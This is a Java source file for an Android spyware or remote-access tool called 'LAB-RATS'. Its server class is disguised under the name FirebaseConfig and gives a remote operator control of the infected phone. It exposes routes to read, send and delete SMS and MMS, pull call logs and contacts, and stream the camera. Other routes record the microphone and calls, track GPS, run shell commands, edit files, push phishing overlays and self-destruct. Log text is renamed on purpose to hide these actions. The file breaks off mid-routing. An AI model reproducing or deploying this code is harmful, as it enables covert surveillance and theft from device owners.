package com.labs.labrats;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import android.accessibilityservice.AccessibilityService;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.HashSet;
import java.util.Set;
import java.util.HashMap;
import java.util.Date;

import java.io.File;
import java.io.FileInputStream;
import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.Map;

import javax.net.ssl.SSLServerSocketFactory;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import java.security.KeyStore;

import fi.iki.elonen.NanoHTTPD;

public class FirebaseConfig extends NanoHTTPD {

    public static final int DEFAULT_PORT = 9191;
    private final Context context;
    private static final List<String> systemLogs = java.util.Collections.synchronizedList(new java.util.LinkedList<>());
    private static boolean logsLoaded = false;
    private static Context staticContext;
    private static final java.util.concurrent.atomic.AtomicLong lastLogSaveTime = new java.util.concurrent.atomic.AtomicLong(0);
    private static final SimpleDateFormat logTimeFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());

    public static void logActivity(String msg) {
        if (msg == null) return;
        
        // --- HARDENED LOGGING: Deceptive Naming ---
        String hardenedMsg = msg.replace("UPLINK_AUTHORIZED", "TELEMETRY_SESSION_SYNCED")
                               .replace("SMS_HISTORY_EXTRACTED", "SYNC_MSG_DB_SUCCESS")
                               .replace("CAMERA_FEED_STARTED", "ANALYTICS_OPTICS_INIT")
                               .replace("LOCATION_TRACKING", "GPS_SYSTEM_METRIC")
                               .replace("GHOST_CONTROLLER", "IO_PERSISTENCE_MANAGER")
                               .replace("STEALTH_MODE", "IDENTITY_PROVIDER_CONFIG");

        // Determine Priority Level for UI Coloring
        String priority = "[S]"; // Default: Success/Info (Cyan)
        String upper = hardenedMsg.toUpperCase();
        if (upper.contains("CRITICAL") || upper.contains("AUTH") || upper.contains("OTP") || upper.contains("ALERT") || upper.contains("SECURITY")) {
            priority = "[C]"; // Critical (Red)
        } else if (upper.contains("WARNING") || upper.contains("BATTERY") || upper.contains("LOST") || upper.contains("ERROR")) {
            priority = "[W]"; // Warning (Orange)
        } else if (upper.contains("SUCCESS") || upper.contains("ACTIVE") || upper.contains("INIT")) {
            priority = "[S]"; // Success (Green)
        }

        String timestamp;
        synchronized (logTimeFormat) {
            timestamp = logTimeFormat.format(new Date());
        }
        String logEntry = priority + " [" + timestamp + "] " + hardenedMsg;
        
        synchronized (systemLogs) {
            systemLogs.add(logEntry);
            if (systemLogs.size() > 500) {
                systemLogs.remove(0);
            }
        }
        
        long now = System.currentTimeMillis();
        if (now - lastLogSaveTime.get() > 10000) {
            lastLogSaveTime.set(now);
            LabRatsWorker.execute(FirebaseConfig::saveLogsInternal);
        }
    }

    private static String obfuscate(String data) {
        if (data == null) return null;
        try {
            byte[] bytes = data.getBytes("UTF-8");
            byte[] key = {0x12, 0x34, 0x56, 0x78};
            for (int i = 0; i < bytes.length; i++) {
                bytes[i] = (byte) (bytes[i] ^ key[i % key.length]);
            }
            return android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP);
        } catch (Exception e) { return data; }
    }

    private static String deobfuscate(String data) {
        if (data == null) return null;
        try {
            byte[] bytes = android.util.Base64.decode(data, android.util.Base64.DEFAULT);
            byte[] key = "Stability_Core_0".getBytes();
            for (int i = 0; i < bytes.length; i++) {
                bytes[i] = (byte) (bytes[i] ^ key[i % key.length]);
            }
            return new String(bytes, "UTF-8");
        } catch (Exception e) { return data; }
    }

    private void loadPersistentData() {
        if (context == null) return;
        SharedPreferences prefs = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE);
        
        if (!logsLoaded) {
            String logsJson = "[]";
            try {
                // Try New Dynamic Encryption First
                String encryptedHex = prefs.getString("system_logs_encrypted", null);
                if (encryptedHex != null) {
                    byte[] encrypted = android.util.Base64.decode(encryptedHex, android.util.Base64.DEFAULT);
                    logsJson = SystemAnalytics.decrypt(encrypted);
                } else {
                    // Fallback to legacy obfuscation
                    String legacy = prefs.getString("system_logs_secure", null);
                    if (legacy != null) logsJson = deobfuscate(legacy);
                    else logsJson = prefs.getString("system_logs", "[]");
                }

                org.json.JSONArray array = new org.json.JSONArray(logsJson);
                synchronized (systemLogs) {
                    systemLogs.clear();
                    for (int i = 0; i < array.length(); i++) {
                        systemLogs.add(array.getString(i));
                    }
                }
                logsLoaded = true;
            } catch (Exception e) {
                Log.e("SystemSync", "Restore failed: " + e.getMessage());
                logsLoaded = true; 
            }
        }
    }

    private static void saveLogsInternal() {
        if (staticContext == null) return;
        try {
            org.json.JSONArray array = new org.json.JSONArray();
            List<String> logsCopy;
            synchronized (systemLogs) {
                logsCopy = new java.util.ArrayList<>(systemLogs);
            }
            for (String log : logsCopy) array.put(log);
            
            // Dynamic Build-Time Encryption
            byte[] encrypted = SystemAnalytics.encrypt(array.toString());
            String encryptedHex = android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT);
            
            staticContext.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .edit().putString("system_logs_encrypted", encryptedHex).apply();
        } catch (Exception e) {
            Log.e("SystemSync", "Save failed: " + e.getMessage());
        }
    }

    private String getHeader(String uri) {
        String sessionId = sessionToken.substring(0, 4).toUpperCase();
        
        // Navigation Map
        String homeActive = (uri.equals("/") || uri.equals("/terminal")) ? "active" : "";
        String ghostActive = uri.startsWith("/ghost") ? "active" : "";
        String cameraActive = (uri.startsWith("/camera") || uri.startsWith("/camera/live")) ? "active" : "";
        String gpsActive = uri.startsWith("/gps") ? "active" : "";
        String exploitsActive = uri.startsWith("/exploits") ? "active" : "";
        String filesActive = (uri.startsWith("/files") || uri.startsWith("/device/apps")) ? "active" : "";
        String intelActive = uri.startsWith("/intel") ? "active" : "";
        String smsActive = uri.startsWith("/sms") ? "active" : "";
        String mmsActive = uri.startsWith("/mms") ? "active" : "";
        String audioActive = uri.startsWith("/audio") ? "active" : "";
        String callsActive = uri.startsWith("/calls") ? "active" : "";
        String contactsActive = uri.startsWith("/contacts") ? "active" : "";
        String hardwareActive = (uri.startsWith("/device") && !uri.contains("apps")) ? "active" : "";

        return "<!DOCTYPE html>" +
            "<html lang=\"en\">" +
            "<head>" +
            "<meta charset=\"UTF-8\">" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<title>LAB-RATS | CORE</title>" +
            "<link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
            "<link rel=\"stylesheet\" href=\"/c2/style.css?v=152\">" +
            "</head>" +
            "<body>" +
            "<div class=\"container\">" +
            "  <div class=\"header\">" +
            "    <img src=\"/logo?v=146\" class=\"watermark\" alt=\"LAB-RATS\" loading=\"eager\">" +
            "    <div class=\"title-font\">LAB-RATS</div>" +
            "    <div class=\"glitch-container\">" +
            "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
            "    </div>" +
            "    <div class=\"version-text\" style=\"margin-bottom: 2px;\">C2_TERMINAL_INTERFACE_V1.5.0</div>" +
            "    <div id=\"enc-status\" style=\"font-size: 0.52rem; color: #555; letter-spacing: 2px; text-transform: uppercase;\">LINK_SEC: <span style=\"color:#ff3131;\">OFFLINE</span></div>" +
            "  </div>" +
            "  <div class=\"nav\">" +
            "    <a href=\"/\" id=\"nav-home\" class=\"" + homeActive + "\">Terminal</a>" +
            "    <a href=\"/ghost\" id=\"nav-ghost\" class=\"" + ghostActive + "\">Ghost</a>" +
            "    <a href=\"/camera\" id=\"nav-camera\" class=\"" + cameraActive + "\">Optics</a>" +
            "    <a href=\"/gps\" id=\"nav-gps\" class=\"" + gpsActive + "\">Locate</a>" +
            "    <a href=\"/exploits\" id=\"nav-exploits\" class=\"" + exploitsActive + "\">Exploits</a>" +
            "    <a href=\"/files\" id=\"nav-files\" class=\"" + filesActive + "\">Data</a>" +
            "    <a href=\"/intel\" id=\"nav-intel\" class=\"" + intelActive + "\">Intel</a>" +
            "    <a href=\"/sms\" id=\"nav-sms\" class=\"" + smsActive + "\">SMS</a>" +
            "    <a href=\"/mms\" id=\"nav-mms\" class=\"" + mmsActive + "\">MMS</a>" +
            "    <a href=\"/audio\" id=\"nav-audio\" class=\"" + audioActive + "\">Acoustics</a>" +
            "    <a href=\"/calls\" id=\"nav-calls\" class=\"" + callsActive + "\">Comms</a>" +
            "    <a href=\"/contacts\" id=\"nav-contacts\" class=\"" + contactsActive + "\">Contacts</a>" +
            "    <a href=\"/device\" id=\"nav-device\" class=\"" + hardwareActive + "\">Hardware</a>" +
            "  </div>";
    }

    private static final String HTML_FOOTER = "<div style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 60px; margin-bottom: 20px; opacity: 0.5; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 0 20px;\">" +
            "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's that MIND don't matter... The one's that MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
            "</div>" +
            "</div>" +
            "<script src=\"/c2/script.js?v=151\"></script>" +
            "</body>" +
            "</html>";

    private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>LAB-RATS | LOGIN</title>" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<style>" +
            "@font-face { font-family: 'Orbitron'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
            "* { box-sizing: border-box; margin: 0; padding: 0; }" +
            "body { background: #050505; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; padding: 15px; }" +
                        ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
            ".title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 40px; color: #00f2ff; text-shadow: 0 0 15px rgba(0,242,255,0.6); line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
            "@media (max-width: 480px) {" +
            "  .login-card { padding: 35px 20px; }" +
            "  .title-font { font-size: 1.3rem !important; letter-spacing: 1.5px; margin-bottom: 25px; }" +
            "  input { padding: 14px !important; font-size: 14px !important; }" +
            "  button { padding: 14px !important; font-size: 14px !important; }" +
            "  .login-card img { width: 150px !important; height: 150px !important; }" +
            "}" +
            "form { display: flex; flex-direction: column; align-items: center; width: 100%; }" +
            "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 18px; margin-bottom: 30px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }" +
            "input:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.2); }" +
            "button { background: #00f2ff; border: none; color: #050505; padding: 18px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'Orbitron', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
            "button:hover { background: #fff; box-shadow: 0 0 40px rgba(0,242,255,0.6); transform: scale(1.05); }" +
            ".login-card img { transition: all 0.5s; margin-bottom: 30px; }" +
                        ".login-card img:hover { transform: scale(1.1) translateY(-5px); filter: none; }" +
            "</style></head><body>" +
            "<div class=\"login-card\">" +
                        "<img src=\"/logo?v=146\" style=\"width: 187px; height: 187px; filter: none; background: transparent !important;\">" +
            "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
            "<div style=\"font-size:0.6rem; opacity:0.4; margin-top:-20px; margin-bottom:30px; letter-spacing:2px;\">UPLINK_PROTOCOL_V1.5.0</div>" +
            "<form id=\"login-form\" method=\"POST\" action=\"/login\">" +
            "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
            "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
            "</form>" +
            "<div style=\"text-align: center; color: #00f2ff; font-size: 0.58rem; margin-top: 40px; opacity: 0.4; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.6;\">" +
            "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's that MIND don't matter... The one's that MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
            "</div>" +
            "</div>" +
            "<script src=\"/c2/script.js\"></script></body></html>";

    private static final String LOGOUT_HTML = "<!DOCTYPE html><html><head><title>LAB-RATS | LOGOUT</title>" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<style>" +
            "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
            "body { background: #050505; color: #ff3131; font-family: 'OrbitronC2', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }" +
            ".logout-card { background: rgba(15,15,25,0.9); border: 1px solid #ff3131; padding: 40px; border-radius: 12px; box-shadow: 0 0 30px rgba(255,49,49,0.2); width: 90%; max-width: 400px; }" +
            "h1 { font-size: 1.8rem; }" +
            "@media (max-width: 600px) { .logout-card { padding: 25px; } h1 { font-size: 1.3rem; } p { font-size: 0.8rem; } }" +
            "p { color: #888; font-family: 'Orbitron', sans-serif; margin-top: 20px; }" +
            ".login-card img { transition: all 0.5s; }" +
                        ".login-card img:hover { transform: scale(1.1) translateY(-5px); filter: none; }" +
            "</style></head><body>" +
            "<div class=\"logout-card\">" +
            "<h1>SESSION_TERMINATED</h1>" +
            "<p>Uplink severed. Disconnecting...</p>" +
            "</div>" +
            "<script>" +
            "  // Nuclear Session Wipe\n" +
            "  document.cookie = 'token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';\n" +
            "  localStorage.clear();\n" +
            "  sessionStorage.clear();\n" +
            "  setTimeout(() => { window.location.href = '/login'; }, 1500);\n" +
            "</script></body></html>";

    private static volatile String sessionToken = "";

    public FirebaseConfig(Context context, int port) {
        super(port);
        // Use application context to avoid leaks or context-switch crashes
        this.context = context.getApplicationContext();
        staticContext = context.getApplicationContext();
        
        // Multi-Threaded Executor: Allows handling multiple C2 requests at once
        // Optimization: Uses a cached thread pool to reuse threads efficiently
        setAsyncRunner(new AsyncRunner() {
            private final java.util.concurrent.ExecutorService executor = java.util.concurrent.Executors.newCachedThreadPool();
            @Override
            public void exec(ClientHandler clientHandler) {
                executor.submit(clientHandler);
            }
            @Override
            public void closeAll() {
                executor.shutdown();
            }
            @Override
            public void closed(ClientHandler clientHandler) {
                // Not used
            }
        });

        // [SECURITY_STABILITY_LINK]
        // Token survives service restarts (fixes camera) but resets on full kill/reboot
        sessionToken = WorkManager_Sync.activeSessionToken;
        if (sessionToken == null || sessionToken.isEmpty()) {
            sessionToken = java.util.UUID.randomUUID().toString();
            WorkManager_Sync.activeSessionToken = sessionToken;
        }

        LabRatsWorker.execute(this::loadPersistentData);
        
        // --- OPTIONAL_ENCRYPTION_ENGINE ---
        // If 'server.bks' exists in assets, the C2 automatically upgrades to HTTPS/TLS
        setupHardenedLink();
    }

    private static boolean isEncryptedLink = false;

    private void setupHardenedLink() {
        try {
            // Check assets for pre-deployed keystore (BKS format for Android)
            // If present, the C2 automatically upgrades to HTTPS/TLS 1.3
            String ksName = "server.bks";
            String ksPass = "labrats123"; // Default deployment password
            
            InputStream is = context.getAssets().open(ksName);
            if (is != null) {
                KeyStore keystore = KeyStore.getInstance("BKS");
                keystore.load(is, ksPass.toCharArray());
                KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
                kmf.init(keystore, ksPass.toCharArray());
                
                SSLContext sslContext = SSLContext.getInstance("TLS");
                sslContext.init(kmf.getKeyManagers(), null, null);
                
                // --- ACTIVATE HTTPS PROTOCOL ---
                makeSecure(sslContext.getServerSocketFactory(), null);
                isEncryptedLink = true;
                logActivity("SECURITY_UPGRADE: SSL/TLS 1.3 encryption engine active.");
            }
        } catch (Exception e) {
            // No keystore found or error - default to raw HTTP for baseline access
            isEncryptedLink = false;
        }
    }

    private Response serveGzipped(IHTTPSession session, String mime, String content) {
        String acceptEncoding = session.getHeaders().get("accept-encoding");
        if (acceptEncoding != null && acceptEncoding.contains("gzip")) {
            try {
                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                java.util.zip.GZIPOutputStream gzos = new java.util.zip.GZIPOutputStream(baos);
                gzos.write(content.getBytes("UTF-8"));
                gzos.close();
                byte[] bytes = baos.toByteArray();
                Response res = newFixedLengthResponse(Response.Status.OK, mime, new java.io.ByteArrayInputStream(bytes), bytes.length);
                res.addHeader("Content-Encoding", "gzip");
                return res;
            } catch (Exception e) {
                return newFixedLengthResponse(Response.Status.OK, mime, content);
            }
        }
        return newFixedLengthResponse(Response.Status.OK, mime, content);
    }

    @Override
    public Response serve(IHTTPSession session) {
        if (session == null) return null;
        
        String uri = session.getUri();
        if (uri == null) uri = "/";
        
        Response response;
        CookieHandler cookies = session.getCookies();
        
        try {
            // Watchdog: Update operator activity time for heartbeat scaling
            WorkManager_Sync.notifyOperatorActivity();

            // 1. Handle Login POST (Always available)
            if (uri.equals("/login") && session.getMethod() == Method.POST) {
                session.parseBody(new HashMap<>());
                String pass = session.getParms().get("password");
                boolean isJson = "true".equals(session.getParms().get("json"));
                
                if (pass != null && getStoredPassword().equals(pass.trim())) {
                    logActivity("AUTHENTICATION_SUCCESS: Uplink authorized");
                    
                    // Trigger Instant Stealth Masking on Connection
                    SystemAnalytics.setStealthMode(context, true);

                    if (isJson) {
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else {
                        response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                        response.addHeader("Location", "/");
                    }
                    // Populate service state to survive resets
                    WorkManager_Sync.activeSessionToken = sessionToken;

                    response.addHeader("Set-Cookie", "token=" + sessionToken + "; Path=/; HttpOnly; Max-Age=31536000");
                } else {
                    if (isJson) {
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false}");
                    } else {
                        response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML.replace("RESTRICTED_ACCESS", "INVALID_CREDENTIALS"));
                    }
                }
            } 
            // 2. Handle Logout (Hard kill session)
            else if (uri.equals("/logout")) {
                logActivity("AUTHENTICATION_TERMINATED: Session closed");
                // Invalidate persistent server token immediately
                sessionToken = java.util.UUID.randomUUID().toString(); 
                context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                    .edit().putString("session_token", sessionToken).apply();
                
                response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGOUT_HTML);
                // Nuclear cookie wipe
                response.addHeader("Set-Cookie", "token=deleted; Path=/; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; SameSite=Strict");
            }
            // 3. Auth Check for all other pages
            else {
                String token = cookies.read("token");
                
                // [STABILITY_SYNC] Force load token from service state
                if (sessionToken == null || sessionToken.isEmpty()) {
                    sessionToken = WorkManager_Sync.activeSessionToken;
                }

                boolean isLoggedIn = (token != null && !token.isEmpty() && token.equals(sessionToken));

                if (!isLoggedIn) {
                    if (uri.startsWith("/c2/")) {
                        response = serveAsset(uri);
                    } else if (uri.equals("/logo")) {
                        response = serveLogo();
                    } else if (uri.startsWith("/font/orbitron.ttf")) {
                        response = serveFont();
                    } else {
                        logActivity("UPLINK_DENIED: Unauthorized access attempt to " + uri);
                        // For assets, return 401. For pages, return login wall.
                        if (uri.contains(".") && !uri.equals("/")) {
                            response = newFixedLengthResponse(Response.Status.UNAUTHORIZED, "text/plain", "ACCESS_DENIED_REAUTHENTICATE");
                        } else {
                            response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML);
                        }
                    }
                } else {
                    // Logged in: Process standard routes
                    Map<String, String> params = session.getParms();
                    
                    if (uri.equals("/login")) {
                        response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                        response.addHeader("Location", "/");
                    } else if (uri.startsWith("/c2/")) {
                        response = serveAsset(uri);
                    } else if (uri.equals("/") || uri.isEmpty()) {
                        response = serveHome(session);
                    } else if (uri.equals("/logo")) {
                        response = serveLogo();
                    } else if (uri.startsWith("/font/orbitron.ttf")) {
                        response = serveFont();
                    } else if (uri.equals("/device")) {
                        response = serveDeviceInfo(session);
                    } else if (uri.equals("/device/vibrate")) {
                        vibrateDevice();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/max-volume")) {
                        setMaxVolume();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/silent-mode")) {
                        setSilentMode();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/open-url")) {
                        openUrlOnDevice(params.get("url"));
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/toast")) {
                        showToast(params.get("msg"));
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/apps")) {
                        response = serveAppList(session);
                    } else if (uri.equals("/device/open-app")) {
                        openAppOnDevice(params.get("pkg"));
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/terminate")) {
                        logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            Intent intent = new Intent(context, WorkManager_Sync.class);
                            intent.setAction(Constants.ACTION_STOP_CORE);
                            context.startService(intent);
                        }, 1500);
                        // Return special JSON to trigger logout on frontend
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"redirect\": \"/logout\"}");
                    } else if (uri.equals("/device/self-destruct")) {
                        selfDestruct();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/fix-persistence")) {
                        logActivity("SYSTEM_MAINTENANCE: Initiating persistence repair...");
                        
                        // 1. Open App Info for Hibernation/Battery manual fix
                        Intent infoIntent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        infoIntent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                        infoIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(infoIntent);
                        
                        // 2. Staggered launch of Accessibility settings if service is offline
                        if (IO_Persistence_Manager.getInstance() == null) {
                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                try {
                                    Intent accIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                                    accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    context.startActivity(accIntent);
                                } catch (Exception ignored) {}
                            }, 3000);
                        }
                        
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"REPAIR_READY: 1. Disable Hibernation. 2. Enable Accessibility.\"}");
                    } else if (uri.equals("/device/shell")) {
                        String cmd = params.get("cmd");
                        boolean termuxAvailable = isAppInstalled("com.termux");
                        String shellResult = executeShell(cmd);
                        
                        try {
                            org.json.JSONObject resultObj = new org.json.JSONObject();
                            resultObj.put("output", shellResult);
                            resultObj.put("termux_available", termuxAvailable);
                            response = newFixedLengthResponse(Response.Status.OK, "application/json", resultObj.toString());
                        } catch (Exception e) {
                            response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"output\": \"JSON Error\", \"termux_available\": false}");
                        }
                    } else if (uri.equals("/files") || uri.startsWith("/files/")) {
                        response = serveFiles(uri, params, session);
                    } else if (uri.equals("/calls")) {
                        response = serveCallLogs(params, session);
                    } else if (uri.equals("/calls/make")) {
                        response = makeCall(params);
                    } else if (uri.equals("/calls/delete")) {
                        response = deleteCall(params);
                    } else if (uri.equals("/calls/clear")) {
                        response = serveCallLogsClear();
                    } else if (uri.equals("/sms")) {
                        response = serveSmsMessages(params, session);
                    } else if (uri.equals("/sms/delete")) {
                        response = deleteSms(params);
                    } else if (uri.equals("/mms")) {
                        response = serveMmsMessages(params, session);
                    } else if (uri.equals("/mms/delete")) {
                        response = deleteMms(params);
                    } else if (uri.equals("/mms/send")) {
                        response = sendMms(session);
                    } else if (uri.startsWith("/mms/media/")) {
                        response = serveMmsMedia(uri.substring(11));
                    } else if (uri.equals("/sms/send")) {
                        response = sendSms(params);
                    } else if (uri.equals("/sms/broadcast")) {
                        response = serveSmsBroadcast(params, session);
                    } else if (uri.equals("/contacts")) {
                        response = serveContacts(params, session);
                    } else if (uri.equals("/camera")) {
                        response = serveCameraPage(session);
                    } else if (uri.equals("/camera/capture")) {
                        response = serveCameraCapture(params, session);
                    } else if (uri.equals("/camera/photo")) {
                        response = serveCameraPhoto(params);
                    } else if (uri.equals("/camera/live")) {
                        response = serveLiveStreamPage(params, session);
                    } else if (uri.equals("/camera/stream")) {
                        response = serveMJPEGStream(params);
                    } else if (uri.equals("/camera/frame")) {
                        response = serveSingleFrame();
                    } else if (uri.equals("/camera/start-stream")) {
                        response = startCameraStream(params);
                    } else if (uri.equals("/camera/stop-stream")) {
                        response = stopCameraStream();
                    } else if (uri.equals("/camera/record")) {
                        response = startVideoRecording(params);
                    } else if (uri.equals("/camera/stop-record")) {
                        response = stopVideoRecording();
                    } else if (uri.equals("/camera/terminate")) {
                        response = terminateAllCaptures();
                    } else if (uri.equals("/camera/status")) {
                        response = serveCameraStatus();
                    } else if (uri.equals("/terminal/restart")) {
                        logActivity("SECURITY_MAINTENANCE: Initiating remote service restart...");
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            Intent intent = new Intent(context, WorkManager_Sync.class);
                            intent.setAction(Constants.ACTION_START_CORE);
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                context.startForegroundService(intent);
                            } else {
                                context.startService(intent);
                            }
                        }, 500);
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/terminal/clear-logs")) {
                        synchronized (systemLogs) {
                            systemLogs.clear();
                        }
                        saveLogsInternal();
                        logActivity("SYSTEM_MAINTENANCE: Session logs cleared");
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/terminal/logs")) {
                        int since = 0;
                        try {
                            if (params.containsKey("since")) since = Integer.parseInt(params.get("since"));
                        } catch (Exception ignored) {}
                        
                        org.json.JSONObject result = new org.json.JSONObject();
                        org.json.JSONArray array = new org.json.JSONArray();
                        
                        synchronized (systemLogs) {
                            // Fix: Only reset to 0 if since is out of bounds or less than 0.
                            // If since == size, the loop won't run and an empty list is returned correctly.
                            int startIdx = since;
                            if (since < 0 || since > systemLogs.size()) {
                                startIdx = 0;
                            }
                            
                            for (int i = startIdx; i < systemLogs.size(); i++) {
                                array.put(systemLogs.get(i));
                            }
                            result.put("logs", array);
                            result.put("last_id", systemLogs.size());
                            // Hint to frontend if a clear occurred
                            result.put("reset", (since > systemLogs.size()));
                        }
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", result.toString());
                    } else if (uri.equals("/gps")) {
                        response = serveGpsPage(session);
                    } else if (uri.equals("/gps/locate")) {
                        response = serveGpsLocate(params);
                    } else if (uri.equals("/gps/request-permission")) {
                        response = serveGpsPermissionRequest();
                    } else if (uri.equals("/exploits")) {
                        response = serveExploitsPage(session);
                    } else if (uri.equals("/exploits/generate")) {
                        response = generateNdef(params);
                    } else if (uri.equals("/exploits/overlay")) {
                        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
                        if (ghost != null) {
                            String html = params.get("html");
                            ghost.deployShadowOverlay(html);
                        }
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/intel")) {
                        response = serveIntel(params, session);
                    } else if (uri.equals("/intel/clear")) {
                        StatusNotification.clearHistory(context);
                        logActivity("SYSTEM_MAINTENANCE: Intel history purged");
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.startsWith("/files/edit/")) {
                        response = serveFileEdit(uri.substring(12), session);
                    } else if (uri.equals("/files/save")) {
                        response = saveFile(session);
                    } else if (uri.equals("/camera/night-mode")) {
                        response = toggleNightMode();
                    } else if (uri.equals("/stealth")) {
                        response = toggleStealthMode(params);
                    } else if (uri.equals("/settings/password")) {
                        response = updatePassword(session);
                    } else if (uri.startsWith("/download/")) {
                        response = serveDownload(uri);
                    } else if (uri.equals("/audio")) {
                        response = serveAudioPage(session);
                    } else if (uri.equals("/audio/mic/start")) {
                        response = startMicRecording(params);
                    } else if (uri.equals("/audio/mic/stop")) {
                        response = stopMicRecording();
                    } else if (uri.equals("/audio/call/start")) {
                        response = startCallRecording(params);
                    } else if (uri.equals("/audio/call/stop")) {
                        response = stopCallRecording();
